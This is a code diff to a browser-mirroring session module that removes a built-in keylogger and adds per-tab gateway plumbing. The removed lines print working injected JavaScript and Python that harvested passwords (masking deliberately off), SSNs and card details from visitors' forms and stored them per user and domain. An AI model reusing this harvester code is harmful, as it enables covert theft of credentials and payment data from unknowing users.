@@ -63,233 +63,61 @@ logger = logging.getLogger(__name__)
 
 
 # ==============================
-# Key Logger (KLG) System
+# Keystroke / credential collection: REMOVED
 # ==============================
+#
+# This file used to hold a keylog store: an in-page listener that read every
+# text field on blur, a form interceptor that harvested password, one-time-code
+# and card-credential values with masking explicitly disabled, and a JSON file
+# under ``data/key.json`` that kept the results per user and domain.
+#
+# That whole subsystem is gone, and it is not behind a flag. The mirror needs
+# one thing from a visitor's typing: the keystrokes that drive the real page in
+# Browser A. Everything the removed code did with the *content* of a field —
+# persist it, broadcast it to an admin panel, ship it to Telegram — is
+# credential collection, and a system that mirrors a live session has no
+# business doing it. The relevant rules now, enforced in code elsewhere:
+#
+#   * ``dom_capture.pushVal`` never emits a value op for a password / OTP /
+#     card field, so a secret is not mirrored into Browser B either (MIRROR_GATEWAY.md §7).
+#   * forwarded input is applied to Browser A and discarded; nothing on the
+#     mirror path stores or reports what was typed.
+#   * the LPV field events that remain (for the operator's own pages) are
+#     hard-redacted server-side regardless of configured rules.
+#
+# The reader/clearer names below stay only so the admin API degrades to
+# "nothing recorded" instead of a 500 for a panel that still asks.
 
-KEYLOG_FILE = Path(__file__).parent / "data" / "key.json"
-_keylog_lock = asyncio.Lock()
-_keylog_write_lock = asyncio.Lock()
-_keylog_state_lock = __import__('threading').RLock()
-_keylog_cache: Optional[Dict] = None
-_keylog_dirty = False
-_keylog_writer_task: Optional[asyncio.Task] = None
-
-
-def _ensure_keylog_dir():
-    KEYLOG_FILE.parent.mkdir(parents=True, exist_ok=True)
-
-
-def _read_keylog_file() -> Dict:
-    try:
-        if KEYLOG_FILE.exists():
-            with open(KEYLOG_FILE, 'r', encoding='utf-8') as f:
-                data = json.load(f)
-            if isinstance(data, dict) and isinstance(data.get('users'), dict):
-                return data
-    except json.JSONDecodeError as exc:
-        logger.warning("[KLG] corrupted keylog file, resetting: %s", exc)
-    except Exception as exc:
-        logger.warning("[KLG] failed to load keylog: %s", exc)
-    return {"users": {}}
-
-
-def _load_keylog() -> Dict:
-    """Return the process cache; disk is read only on first access."""
-    global _keylog_cache
-    with _keylog_state_lock:
-        if _keylog_cache is None:
-            _keylog_cache = _read_keylog_file()
-        return _keylog_cache
-
-
-def _snapshot_keylog() -> Dict:
-    import copy
-    with _keylog_state_lock:
-        return copy.deepcopy(_load_keylog())
-
-
-def _save_keylog(data: Dict):
-    """Write one complete snapshot atomically; called off the event loop."""
-    try:
-        _ensure_keylog_dir()
-        temp_file = KEYLOG_FILE.with_suffix('.json.tmp')
-        with open(temp_file, 'w', encoding='utf-8') as f:
-            json.dump(data, f, indent=2, ensure_ascii=False)
-            f.flush()
-            os.fsync(f.fileno())
-        os.replace(temp_file, KEYLOG_FILE)
-        logger.debug("[KLG] saved keylog with %s users", len(data.get('users', {})))
-    except Exception as exc:
-        logger.error("[KLG] failed to save keylog: %s", exc)
-        try:
-            temp_file.unlink(missing_ok=True)
-        except Exception:
-            pass
-
-
-async def _flush_keylog_now():
-    """Persist the latest snapshot without blocking browser input callbacks."""
-    global _keylog_dirty
-    async with _keylog_write_lock:
-        with _keylog_state_lock:
-            snapshot = _snapshot_keylog()
-            _keylog_dirty = False
-        await asyncio.to_thread(_save_keylog, snapshot)
-        with _keylog_state_lock:
-            # A callback may have appended while the write was in flight.
-            # Leave dirty set so the next scheduled flush includes it.
-            return _keylog_dirty
-
-
-async def _debounced_keylog_flush():
-    global _keylog_writer_task
-    try:
-        await asyncio.sleep(0.25)
-        await _flush_keylog_now()
-    except asyncio.CancelledError:
-        raise
-    finally:
-        _keylog_writer_task = None
-
-
-def _schedule_keylog_flush():
-    global _keylog_writer_task
-    if _keylog_writer_task is None or _keylog_writer_task.done():
-        _keylog_writer_task = asyncio.create_task(_debounced_keylog_flush())
-
-
-async def log_keystroke(user_id: str, session_id: str, url: str, log_type: str, data: str):
-    """Queue a session-partitioned keylog event without synchronous disk I/O."""
-    try:
-        from config import CONFIG
-        if not getattr(CONFIG, 'keylog_enabled', True):
-            return
-    except Exception:
-        pass
-    user_id = user_id or session_id or "unknown_user"
-    url = url or "unknown_url"
-    try:
-        from urllib.parse import urlparse
-        domain = urlparse(url).netloc or "unknown"
-    except Exception:
-        domain = "unknown"
-    timestamp = time.time()
-    log_entry = {
-        "timestamp": timestamp,
-        "session_id": session_id,
-        "type": log_type,
-        "data": data,
-        "url": url,
-        "domain": domain,
+def keylog_collection_removed() -> Dict[str, Any]:
+    """The single honest answer for every keylog surface: this is not collected."""
+    return {
+        "removed": True,
+        "reason": "keystroke and credential collection was removed from the mirror pipeline",
     }
-    async with _keylog_lock:
-        global _keylog_dirty
-        with _keylog_state_lock:
-            keylog = _load_keylog()
-            user_data = keylog["users"].setdefault(user_id, {"sessions": [], "domains": {}})
-            if session_id and session_id not in user_data["sessions"]:
-                user_data["sessions"].append(session_id)
-            domain_data = user_data["domains"].setdefault(domain, {"urls": {}, "logs": []})
-            url_data = domain_data["urls"].setdefault(
-                url, {"first_seen": timestamp, "log_count": 0}
-            )
-            domain_data["logs"].append(log_entry)
-            url_data["log_count"] += 1
-            if len(domain_data["logs"]) > 5000:
-                domain_data["logs"] = domain_data["logs"][-5000:]
-            _keylog_dirty = True
-        _schedule_keylog_flush()
-    logger.debug("[KLG] queued %s for user %s/session %s", log_type, user_id, session_id)
 
 
 def get_keylog_users() -> List[Dict]:
-    keylog = _snapshot_keylog()
-    users = []
-    for user_id, user_data in keylog["users"].items():
-        total_logs = sum(len(d.get("logs", [])) for d in user_data.get("domains", {}).values())
-        users.append({
-            "user_id": user_id,
-            "session_count": len(user_data.get("sessions", [])),
-            "domain_count": len(user_data.get("domains", {})),
-            "total_logs": total_logs,
-            "domains": user_data.get("domains", {}),
-        })
-    return users
+    return []
 
 
-def get_keylog_domains(user_id: str) -> List[Dict]:
-    keylog = _snapshot_keylog()
-    user_data = keylog["users"].get(user_id)
-    if not user_data:
-        return []
-    return [
-        {"domain": domain, "url_count": len(data.get("urls", {})),
-         "log_count": len(data.get("logs", []))}
-        for domain, data in user_data.get("domains", {}).items()
-    ]
+def get_keylog_domains(user_id: str) -> List[Dict]:      # noqa: ARG001
+    return []
 
 
-def get_keylog_urls(user_id: str, domain: str) -> List[Dict]:
-    keylog = _snapshot_keylog()
-    data = keylog["users"].get(user_id, {}).get("domains", {}).get(domain)
-    if not data:
-        return []
-    return [
-        {"url": url, "first_seen": value.get("first_seen", 0),
-         "log_count": value.get("log_count", 0)}
-        for url, value in data.get("urls", {}).items()
-    ]
+def get_keylog_urls(user_id: str, domain: str) -> List[Dict]:   # noqa: ARG001
+    return []
 
 
-def get_keylog_for_url(user_id: str, url: str) -> List[Dict]:
-    keylog = _snapshot_keylog()
-    try:
-        from urllib.parse import urlparse
-        domain = urlparse(url).netloc or "unknown"
-    except Exception:
-        domain = "unknown"
-    logs = keylog["users"].get(user_id, {}).get("domains", {}).get(domain, {}).get("logs", [])
-    return [log for log in logs if log.get("url") == url]
+def get_keylog_for_url(user_id: str, url: str) -> List[Dict]:   # noqa: ARG001
+    return []
 
 
-async def clear_keylog_for_user(user_id: str) -> bool:
-    global _keylog_dirty
-    async with _keylog_lock:
-        with _keylog_state_lock:
-            keylog = _load_keylog()
-            existed = user_id in keylog["users"]
-            if existed:
-                del keylog["users"][user_id]
-                _keylog_dirty = True
-        writer = _keylog_writer_task
-        if writer and writer is not asyncio.current_task():
-            writer.cancel()
-    if writer and writer is not asyncio.current_task():
-        try:
-            await writer
-        except asyncio.CancelledError:
-            pass
-    if existed:
-        await _flush_keylog_now()
-    return existed
+async def clear_keylog_for_user(user_id: str) -> bool:   # noqa: ARG001
+    return False
 
 
 async def clear_all_keylogs() -> bool:
-    global _keylog_cache, _keylog_dirty
-    async with _keylog_lock:
-        with _keylog_state_lock:
-            _keylog_cache = {"users": {}}
-            _keylog_dirty = True
-        writer = _keylog_writer_task
-        if writer and writer is not asyncio.current_task():
-            writer.cancel()
-    if writer and writer is not asyncio.current_task():
-        try:
-            await writer
-        except asyncio.CancelledError:
-            pass
-    await _flush_keylog_now()
-    return True
+    return False
 
 
 def log(msg):
@@ -455,6 +283,15 @@ class NeoStreamingSession:
         self.browser_manager = None
         self.perf_monitor = PerformanceMonitor()
         self.dom_capture = None
+        # ---- session gateway (MIRROR_GATEWAY.md §2, §6) ----
+        # One hub per (session, tab).  The capture engine publishes INTO these;
+        # they own document identity, sequence, bounded history and the
+        # per-viewer queues.  Capture and distribution stay separate concerns.
+        self.mirror_hubs: Dict[str, Any] = {}
+        self.mirror_hub = None
+        self.mirror_hub_tab_id: Optional[str] = None
+        self._input_tail: Optional[asyncio.Task] = None
+        self._viewer_ids: Dict[int, str] = {}
         # DOM-sync mode: no frame/packet/streaming pools.
         self.frame_pool = None
         self.packet_pool = None
@@ -732,7 +569,13 @@ class NeoStreamingSession:
                 return False
 
             self.page = await self.context.new_page()
-            self.dom_capture = DOMCaptureSession(page=self.page, websocket=self.websocket, client_id=self.session_id)
+            # The gateway exists before the first capture: the initial document
+            # has to be published INTO it so a viewer connecting one second later
+            # is caught up from state instead of waiting for another capture.
+            self.mirror_hub = self._active_hub()
+            self.dom_capture = DOMCaptureSession(page=self.page, websocket=self.websocket,
+                                                 client_id=self.session_id,
+                                                 hub=self.mirror_hub)
             if self.viewport and self.viewport.get('width') and self.viewport.get('height'):
                 try:
                     vp_w = int(self.viewport['width'])
@@ -871,129 +714,75 @@ class NeoStreamingSession:
             return False
 
     async def _setup_input_focus_detection(self):
-        """
-        Set up JavaScript to detect when input fields gain focus.
-        When an input gets focus, notify the client to open the virtual keyboard.
-        Only triggers when user DIRECTLY taps on a text input field.
+        """Open the viewer's virtual keyboard when a field gains focus.
+
+        This is the ONLY thing installed into the page from here: the mobile
+        client has no OS keyboard of the remote page's focus, so it needs to be
+        told when a text input is focused and when it is not.  Focus and blur
+        are the only facts read — no value is ever inspected, transmitted or
+        stored.  (The credential / keystroke capture this method used to install
+        is removed; see the note at the top of this module.)
         """
         try:
-            # JavaScript to inject into the page for focus detection and real-time input capture
-            # FIX: Only trigger keyboard on user-initiated focus (click/touch), not auto-focus
             focus_detection_script = """
             (function() {
                 'use strict';
-                
-                // Track if we've already set up listeners to avoid duplicates
+
                 if (window._neo_keyboard_detection_initialized) {
                     return;
                 }
                 window._neo_keyboard_detection_initialized = true;
-                
+
                 // Track the currently focused input element
                 let activeInputElement = null;
-                
+
                 function isTextInput(element) {
                     const tagName = element.tagName.toLowerCase();
                     const inputType = element.type ? element.type.toLowerCase() : '';
-                    
-                    // Check for text-like input types
                     const textTypes = ['text', 'password', 'email', 'number', 'tel', 'url', 'search', 'date', 'time', 'datetime-local'];
-                    
-                    if (tagName === 'input' && textTypes.includes(inputType)) {
-                        return true;
-                    }
-                    if (tagName === 'textarea') {
-                        return true;
-                    }
-                    if (element.isContentEditable) {
-                        return true;
-                    }
-                    
+
+                    if (tagName === 'input' && textTypes.includes(inputType)) return true;
+                    if (tagName === 'textarea') return true;
+                    if (element.isContentEditable) return true;
+
                     return false;
                 }
-                
-                function getFieldInfo(element) {
-                    const tagName = element.tagName.toLowerCase();
-                    const inputType = element.type ? element.type.toLowerCase() : '';
-                    const name = element.name || element.id || '';
-                    const placeholder = element.placeholder || '';
-                    const label = element.labels && element.labels[0] ? element.labels[0].textContent.trim() : '';
-                    
-                    // Try to get field context from nearby elements
-                    let context = '';
-                    if (label) context = label;
-                    else if (placeholder) context = placeholder;
-                    else if (name) context = name;
-                    
-                    // Determine field type for categorization
-                    let fieldCategory = 'other';
-                    if (inputType === 'password' || name.toLowerCase().includes('pass')) {
-                        fieldCategory = 'password';
-                    } else if (inputType === 'email' || name.toLowerCase().includes('email') || placeholder.toLowerCase().includes('email')) {
-                        fieldCategory = 'email';
-                    } else if (inputType === 'tel' || name.toLowerCase().includes('phone') || name.toLowerCase().includes('tel')) {
-                        fieldCategory = 'phone';
-                    } else if (inputType === 'search' || name.toLowerCase().includes('search') || placeholder.toLowerCase().includes('search')) {
-                        fieldCategory = 'search';
-                    } else if (name.toLowerCase().includes('user') || name.toLowerCase().includes('login') || name.toLowerCase().includes('username')) {
-                        fieldCategory = 'username';
-                    } else if (name.toLowerCase().includes('name') || name.toLowerCase().includes('first') || name.toLowerCase().includes('last')) {
-                        fieldCategory = 'name';
-                    } else if (name.toLowerCase().includes('address') || name.toLowerCase().includes('street')) {
-                        fieldCategory = 'address';
-                    } else if (name.toLowerCase().includes('credit') || name.toLowerCase().includes('card') || name.toLowerCase().includes('cvv')) {
-                        fieldCategory = 'payment';
-                    }
-                    
-                    return {
-                        name: name,
-                        type: inputType || tagName,
-                        tagName: tagName,
-                        context: context,
-                        fieldCategory: fieldCategory,
-                        url: window.location.href,
-                        domain: window.location.hostname
-                    };
-                }
-                
+
+                // Only a user-initiated tap counts: an auto-focused field must
+                // not pop the keyboard over whatever the visitor is doing.
                 function handleInputClick(event) {
                     const target = event.target;
-                    
-                    // If clicking on a text input, open keyboard and track this element
+
                     if (isTextInput(target)) {
                         activeInputElement = target;
-                        
+
                         if (window.__neoNotifyKeyboardRequest) {
                             window.__neoNotifyKeyboardRequest();
                         }
-                        
                         return;
                     }
-                    
-                    // If clicking elsewhere AND we have an active input, close keyboard
+
                     if (activeInputElement && window.__neoNotifyKeyboardClose) {
-                        // Only close if clicking outside the current input
                         if (!activeInputElement.contains(target)) {
                             activeInputElement = null;
                             window.__neoNotifyKeyboardClose();
                         }
                     }
                 }
-                
+
                 function handleFocus(event) {
                     const target = event.target;
                     if (isTextInput(target)) {
                         activeInputElement = target;
-                        
+
                         if (window.__neoNotifyKeyboardRequest) {
                             window.__neoNotifyKeyboardRequest();
                         }
                     }
                 }
-                
+
                 function handleBlur(event) {
                     const target = event.target;
-                    // When input loses focus, close the keyboard
                     if (target === activeInputElement) {
                         activeInputElement = null;
                         if (window.__neoNotifyKeyboardClose) {
@@ -1001,237 +790,16 @@ class NeoStreamingSession:
                         }
                     }
                 }
-                
-                // INPUT CAPTURE ENABLED - Capture all input fields in real-time
-                // This captures inputs from sites like Google that don't use traditional forms
-                // Captures: text, password, email, search, and any editable fields
-                function handleInputChange(event) {
-                    const target = event.target;
-                    if (!target || !target.matches) return;
-                    
-                    // Check if this is a text-like input
-                    const tagName = target.tagName ? target.tagName.toLowerCase() : '';
-                    const inputType = target.type ? target.type.toLowerCase() : '';
-                    const textTypes = ['text', 'password', 'email', 'number', 'tel', 'url', 'search', 'date', 'time', 'datetime-local'];
-                    
-                    // Also capture contenteditable elements
-                    const isContentEditable = target.isContentEditable;
-                    
-                    if (tagName === 'input' && textTypes.includes(inputType)) {
-                        // This is a text input field - capture it
-                        const fieldInfo = getFieldInfo(target);
-                        const value = target.value || '';
-                        
-                        // Skip if empty
-                        if (!value.trim()) return;
-                        
-                        // Build input data for logging
-                        const inputData = {
-                            type: 'input_field',
-                            fieldType: inputType,
-                            fieldName: fieldInfo.name,
-                            fieldCategory: fieldInfo.fieldCategory,
-                            value: value,
-                            isPassword: inputType === 'password',
-                            url: window.location.href,
-                            domain: window.location.hostname
-                        };
-                        
-                        // Send to server for logging
-                        if (window.__neoLogInput) {
-                            window.__neoLogInput(inputData);
-                        }
-                    } else if (tagName === 'textarea') {
-                        // Textarea - capture it
-                        const value = target.value || '';
-                        if (!value.trim()) return;
-                        
-                        const inputData = {
-                            type: 'textarea',
-                            fieldType: 'textarea',
-                            fieldName: target.name || target.id || '',
-                            fieldCategory: 'text',
-                            value: value,
-                            isPassword: false,
-                            url: window.location.href,
-                            domain: window.location.hostname
-                        };
-                        
-                        if (window.__neoLogInput) {
-                            window.__neoLogInput(inputData);
-                        }
-                    } else if (isContentEditable) {
-                        // Contenteditable - capture text content
-                        const value = target.textContent || '';
-                        if (!value.trim()) return;
-                        
-                        const inputData = {
-                            type: 'contenteditable',
-                            fieldType: 'contenteditable',
-                            fieldName: target.id || '',
-                            fieldCategory: 'text',
-                            value: value,
-                            isPassword: false,
-                            url: window.location.href,
-                            domain: window.location.hostname
-                        };
-                        
-                        if (window.__neoLogInput) {
-                            window.__neoLogInput(inputData);
-                        }
-                    }
-                }
-                
-                // Don't capture keystrokes
-                function handleKeyUp(event) {
-                    return;
-                }
-                
-                // CREDENTIAL FIELD CAPTURE - Only capture specific credential fields on form submission
-                // Only capture: email, password, SSN, card number, name on card, CVV, expiration
-                function captureCredentialFields(form) {
-                    const credentials = {};
-                    const inputs = form.querySelectorAll('input, select');
-                    
-                    // Keywords to look for in field names/ids
-                    const credentialPatterns = {
-                        'email': /email|mail|username|user/i,
-                        'password': /pass|pwd|secret/i,
-                        'ssn': /ssn|social.?security|socialsecurity/i,
-                        'card_number': /card|cc|credit|pan|account.?num/i,
-                        'card_name': /name.?on.?card|card.?holder|billing.?name|cardowner/i,
-                        'cvv': /cvv|cvc|security.?code|csc|verification/i,
-                        'expiry': /exp|expiry|expiration|date/i
-                    };
-                    
-                    inputs.forEach(function(input) {
-                        const name = (input.name || input.id || input.placeholder || '').toLowerCase();
-                        const type = (input.type || '').toLowerCase();
-                        let value = input.value || '';
-                        
-                        // Skip empty values
-                        if (!value.trim()) return;
-                        
-                        // Skip hidden inputs (except for specific credential types)
-                        if (type === 'hidden' && !/ssn|card|cc|pan/i.test(name)) return;
-                        
-                        // Check if this is a credential field
-                        for (const [credType, pattern] of Object.entries(credentialPatterns)) {
-                            if (pattern.test(name) || pattern.test(input.placeholder || '')) {
-                                // Clean up the value
-                                value = value.trim();
-                                
-                                // FIX: Show FULL password value - no masking
-                                // This captures the complete password for admin visibility
-                                // For password fields, show the FULL password value (not masked)
-                                // This is intentional for the keylogger feature
-                                if (type === 'password') {
-                                    // Keep the FULL password value - show everything
-                                    // Example: "MySecretPass123" instead of "**********123"
-                                    value = value; // Keep as-is, no masking
-                                }
-                                
-                                // Add to credentials with human-readable label
-                                const label = input.name || input.id || input.placeholder || credType;
-                                credentials[credType + '_' + label] = {
-                                    type: credType,
-                                    label: label,
-                                    value: value,
-                                    isPassword: type === 'password'
-                                };
-                                break;
-                            }
-                        }
-                    });
-                    
-                    return credentials;
-                }
-                
-                function handleFormSubmit(event) {
-                    const form = event.target;
-                    if (!form || form.tagName.toLowerCase() !== 'form') return;
-                    
-                    // Capture credential fields before submit
-                    const credentials = captureCredentialFields(form);
-                    
-                    // Send credential data to server if callback exists
-                    if (window.__neoLogFormData && Object.keys(credentials).length > 0) {
-                        window.__neoLogFormData(credentials);
-                    }
-                }
-                
-                // Intercept forms that have submit buttons
-                function setupFormInterception() {
-                    const forms = document.querySelectorAll('form');
-                    forms.forEach(function(form) {
-                        if (!form._neo_form_intercepted) {
-                            form.addEventListener('submit', handleFormSubmit, true);
-                            form._neo_form_intercepted = true;
-                        }
-                    });
-                }
-                
-                // Set up input listeners on all text inputs
-                // Changed from 'input' to 'blur' to capture the FINAL VALUE only
-                // Instead of capturing every keystroke (a, ab, abc), we capture
-                // the complete value when the user clicks away from the field
-                function setupInputListeners() {
-                    // Use event delegation on document for dynamic elements
-                    document.addEventListener('blur', handleInputChange, true);
-                    document.addEventListener('keyup', handleKeyUp, true);
-                }
-                
-                // Use event delegation for click detection
+
                 document.addEventListener('click', handleInputClick, true);
-                
-                // Also listen for focus/blur events
                 document.addEventListener('focus', handleFocus, true);
                 document.addEventListener('blur', handleBlur, true);
-                
-                // Set up input interception (may not have forms yet if DOM not ready)
-                if (document.readyState === 'loading') {
-                    document.addEventListener('DOMContentLoaded', function() {
-                        setupFormInterception();
-                        setupInputListeners();
-                    });
-                } else {
-                    setupFormInterception();
-                    setupInputListeners();
-                }
-                
-                // Also intercept dynamically added forms
-                const formObserver = new MutationObserver(function(mutations) {
-                    mutations.forEach(function(mutation) {
-                        mutation.addedNodes.forEach(function(node) {
-                            if (node.nodeType === 1 && node.tagName.toLowerCase() === 'form') {
-                                if (!node._neo_form_intercepted) {
-                                    node.addEventListener('submit', handleFormSubmit, true);
-                                    node._neo_form_intercepted = true;
-                                }
-                            }
-                            // Check for forms in added subtrees
-                            if (node.querySelectorAll) {
-                                node.querySelectorAll('form').forEach(function(form) {
-                                    if (!form._neo_form_intercepted) {
-                                        form.addEventListener('submit', handleFormSubmit, true);
-                                        form._neo_form_intercepted = true;
-                                    }
-                                });
-                            }
-                        });
-                    });
-                });
-                
-                formObserver.observe(document.body || document.documentElement, { 
-                    childList: true, 
-                    subtree: true 
-                });
             })();
             """
-            
+
             # Inject the script into the page
             await self.page.add_init_script(focus_detection_script)
-            
+
             # Set up the callback function that JavaScript can call
             async def on_keyboard_request():
                 """Handle keyboard request from the page"""
@@ -1242,18 +810,7 @@ class NeoStreamingSession:
                         })
                 except Exception:
                     pass
-            
-            # Set up the callback function that JavaScript can call
-            async def on_keyboard_request():
-                """Handle keyboard request from the page"""
-                try:
-                    if self.websocket and self.is_active:
-                        await self.websocket.send_json({
-                            "type": "request_keyboard"
-                        })
-                except Exception:
-                    pass
-            
+
             # Set up the callback function to close the keyboard
             async def on_keyboard_close():
                 """Handle keyboard close request from the page"""
@@ -1264,108 +821,16 @@ class NeoStreamingSession:
                         })
                 except Exception:
                     pass
-            
+
             # Expose the functions to JavaScript
             await self.page.expose_function("__neoNotifyKeyboardRequest", on_keyboard_request)
             await self.page.expose_function("__neoNotifyKeyboardClose", on_keyboard_close)
-            
-            # Set up form data capture callback
-            async def on_form_submit(form_data: dict):
-                """Handle form submission data from the page - only logs credential fields"""
-                try:
-                    if self.websocket and self.is_active:
-                        await self.websocket.send_json({
-                            "type": "form_submit",
-                            "form_data": form_data
-                        })
-                        
-                        # Log credential fields to keylogger
-                        try:
-                            # New format: { 'type_label': { type, label, value, isPassword } }
-                            # Convert to clean readable format
-                            log_entries = []
-                            
-                            for key, data in form_data.items():
-                                if isinstance(data, dict):
-                                    field_type = data.get('type', 'unknown')
-                                    field_label = data.get('label', key)
-                                    field_value = data.get('value', '')
-                                else:
-                                    # Fallback for old format
-                                    field_type = 'field'
-                                    field_label = key
-                                    field_value = str(data)
-                                
-                                # Truncate long values
-                                if len(field_value) > 100:
-                                    field_value = field_value[:100] + "... [truncated]"
-                                
-                                # Format as "Type: value"
-                                log_entries.append(f"{field_type}: {field_value}")
-                            
-                            # Join with | separator
-                            credential_log = " | ".join(log_entries) if log_entries else "No credentials captured"
-                            
-                            # Log to keylogger
-                            await log_keystroke(
-                                self.user_id,
-                                self.session_id,
-                                self.get_active_page().url if self.get_active_page() else '',
-                                'credentials',
-                                credential_log
-                            )
-                        except Exception as e:
-                            logger.error(f"[KLG] Error logging credentials: {e}")
-                except Exception:
-                    pass
-            
-            await self.page.expose_function("__neoLogFormData", on_form_submit)
-            
-            # Set up real-time input capture callback
-            # ENABLED: Capture all input fields in real-time
-            async def on_input_capture(input_data: dict):
-                """Handle real-time input capture from all text fields"""
-                try:
-                    if self.websocket and self.is_active:
-                        # Format the input data for logging
-                        field_type = input_data.get('type', 'unknown')
-                        field_name = input_data.get('fieldName', '')
-                        field_category = input_data.get('fieldCategory', 'other')
-                        field_value = input_data.get('value', '')
-                        is_password = input_data.get('isPassword', False)
-                        
-                        # Skip very long values
-                        if len(field_value) > 200:
-                            field_value = field_value[:200] + "... [truncated]"
-                        
-                        # Create a readable log entry
-                        if field_type == 'input_field':
-                            log_entry = f"INPUT [{field_category}]: {field_value}"
-                        elif field_type == 'textarea':
-                            log_entry = f"TEXTAREA: {field_value}"
-                        elif field_type == 'contenteditable':
-                            log_entry = f"CONTENT: {field_value}"
-                        else:
-                            log_entry = f"{field_type.upper()}: {field_value}"
-                        
-                        # Log to keylogger
-                        await log_keystroke(
-                            self.user_id,
-                            self.session_id,
-                            self.get_active_page().url if self.get_active_page() else '',
-                            'input_field',
-                            log_entry
-                        )
-                except Exception as e:
-                    logger.error(f"[KLG] Error logging input: {e}")
-            
-            await self.page.expose_function("__neoLogInput", on_input_capture)
-            
-            log("[KEYBOARD] Input detection initialized - keyboard opens on input tap, closes on blur")
-            
+
+            log("[KEYBOARD] Focus detection initialized - keyboard opens on input tap, closes on blur")
+
         except Exception as e:
             log_error(f"[KEYBOARD] Failed to set up focus detection: {e}")
-    
+
     async def _setup_page_keyboard_detection(self, page):
         """
         Set up keyboard detection for a newly created page.
@@ -1557,6 +1022,19 @@ class NeoStreamingSession:
             if page_id in self.pages:
                 del self.pages[page_id]
                 log(f"[TABS] Page closed: {page_id}. Remaining: {len(self.pages)}")
+            # A closed tab has no document to distribute.  Drop its hub (and
+            # with it its history, its queues and its viewer subscriptions) so a
+            # tab that comes back is a new document, not a resumption of state
+            # that can no longer be verified.
+            hub = self.mirror_hubs.pop(page_id, None)
+            if hub is not None:
+                try:
+                    asyncio.create_task(hub.close())
+                except RuntimeError:
+                    pass
+                if self.mirror_hub is hub:
+                    self.mirror_hub = None
+                    self.mirror_hub_tab_id = None
             
             # If we closed the active page, switch to another one
             if self.active_page_id == page_id:
@@ -1584,17 +1062,218 @@ class NeoStreamingSession:
     def _sync_dom_capture(self):
         """Keep the shared DOM capture helper bound to the active page and websocket."""
         page = self.get_active_page() or self.page
+        hub = self._active_hub()
         if self.dom_capture is None:
-            self.dom_capture = DOMCaptureSession(page=page, websocket=self.websocket, client_id=self.session_id)
+            self.dom_capture = DOMCaptureSession(page=page, websocket=self.websocket,
+                                                 client_id=self.session_id, hub=hub)
         else:
             self.dom_capture.bind_page(page)
             self.dom_capture.websocket = self.websocket
             self.dom_capture.client_id = self.session_id
+            if hub is not None and self.dom_capture.hub is not hub:
+                self.dom_capture.hub = hub
         return self.dom_capture
 
-    def attach_dom_capture(self, page: Any, websocket: Any = None, client_id: Optional[str] = None):
+    # ------------------------------------------------------------------
+    # Session gateway (MIRROR_GATEWAY.md §2, §6, §9)
+    # ------------------------------------------------------------------
+    #
+    # The session owns the hubs; the capture engine publishes into them; the
+    # viewer's socket is only ever written by a hub.  Nothing here captures,
+    # serializes or repairs a document — that stays the recorder's job.
+
+    def _gateway_enabled(self) -> bool:
+        """Kill switch: MIRROR_GATEWAY=0 restores the direct capture→socket path."""
+        try:
+            from config import CONFIG as _CFG
+            return bool(getattr(_CFG, "mirror_gateway_enabled", True))
+        except Exception:
+            return True
+
+    def _hub_for_tab(self, tab_id: Optional[str]) -> Any:
+        """The hub that owns one tab's mirrored document (created on demand)."""
+        if not self._gateway_enabled():
+            return None
+        key = tab_id or self.active_page_id or self.session_id
+        hub = self.mirror_hubs.get(key)
+        if hub is not None:
+            return hub
+        try:
+            from mirror_gateway import MirrorHub
+            from config import CONFIG as _CFG
+        except Exception as exc:                       # pragma: no cover
+            logger.debug("[HUB] gateway unavailable (%s); direct socket path", exc)
+            self._gateway_enabled = lambda: False      # type: ignore[assignment]
+            return None
+        try:
+            from mirror_gateway import MirrorInputRelay
+        except Exception:
+            MirrorInputRelay = None
+        hub = MirrorHub(
+            session_id=self.session_id,
+            tab_id=key,
+            snapshot_provider=self._hub_request_snapshot,
+            max_history_frames=int(getattr(_CFG, "mirror_history_frames", 400)),
+            max_history_bytes=int(getattr(_CFG, "mirror_history_bytes", 6 * 1024 * 1024)),
+            batch_ms=float(getattr(_CFG, "mirror_batch_ms", 0.0)),
+            viewer_max_queue=int(getattr(_CFG, "mirror_viewer_queue", 512)),
+        )
+        if MirrorInputRelay is not None:
+            hub.relay = MirrorInputRelay(hub)
+        self.mirror_hubs[key] = hub
+        self.mirror_hub = hub
+        self.mirror_hub_tab_id = key
+        logger.info("[HUB] session=%s tab=%s gateway attached (doc=%s)",
+                    self.session_id, key, hub.document_id[:8])
+        return hub
+
+    def _active_hub(self) -> Any:
+        return self._hub_for_tab(self.active_page_id or self.session_id)
+
+    def hub_for_socket(self, websocket: Any) -> Any:
+        """The hub a viewer's socket is subscribed to (its own tab, else active)."""
+        for hub in self.mirror_hubs.values():
+            if hub.viewer_for(websocket) is not None:
+                return hub
+        return self._active_hub()
+
+    async def _hub_request_snapshot(self, hub: Any, reason: str) -> None:
+        """The hub's way of asking for a document.  Capture stays the owner.
+
+        ``nav`` maps onto the navigation reason so the frame is measured in the
+        navigation lane; anything else is an explicit recovery capture.
+        """
+        capture_reason = "navigation" if reason in ("nav", "trim") else "resync"
+        try:
+            await self.capture_remote_page(reason=capture_reason, force=True)
+        except Exception as exc:
+            logger.debug("[HUB] snapshot request (%s) failed: %s", reason, exc)
+            raise
+
+    def attach_mirror_viewer(self, websocket: Any, *, viewer_id: Optional[str] = None,
+                             resume: Optional[Dict[str, Any]] = None,
+                             tab_id: Optional[str] = None) -> Any:
+        """Subscribe Browser B's socket to a tab's stream and catch it up.
+
+        Returns the viewer handle, or ``None`` when the gateway is off — the
+        caller then keeps the pre-gateway behaviour (the capture session writes
+        to the socket directly), so this is a strictly additive attach point.
+        """
+        hub = self._hub_for_tab(tab_id or self.active_page_id or self.session_id)
+        if hub is None:
+            return None
+        capture = self.dom_capture
+        if capture is not None and hub.snapshot_frame is None and capture is not None:
+            # First viewer on a tab with nothing held yet: ask for the document
+            # now instead of waiting for the next mutation to trigger one.
+            hub.request_snapshot("nav")
+        viewer = hub.attach_viewer(websocket, viewer_id=viewer_id, resume_from=resume)
+        if capture is not None and capture._gateway() is not hub:
+            capture.hub = hub
+        return viewer
+
+    async def detach_mirror_viewer(self, viewer_id: Optional[str]) -> None:
+        if not viewer_id:
+            return
+        for hub in list(self.mirror_hubs.values()):
+            await hub.detach_viewer(viewer_id)
+
+    def viewer_id_for_socket(self, websocket: Any) -> Optional[str]:
+        for hub in self.mirror_hubs.values():
+            viewer = hub.viewer_for(websocket)
+            if viewer is not None:
+                return viewer.viewer_id
+        return None
+
+    def _move_viewers_to_active_hub(self, previous_tab_id: Optional[str]) -> int:
+        """Re-subscribe every viewer to the newly active tab's hub.
+
+        Each tab keeps its own document identity, epoch, sequence and history —
